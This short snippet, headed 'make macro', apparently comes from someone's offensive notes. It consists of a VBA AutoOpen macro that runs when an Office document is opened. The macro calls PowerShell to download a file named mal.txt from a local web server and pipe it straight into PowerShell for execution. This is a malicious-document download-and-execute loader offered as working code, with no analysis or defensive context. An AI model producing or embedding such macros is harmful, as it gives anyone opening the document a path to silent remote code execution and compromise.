make macro :

Sub AutoOpen()
    Shell ("powershell /c ""(Invoke-WebRequest ""http://127.0.0.1:8080/mal.txt"").Content | powershell"" ")
End Sub
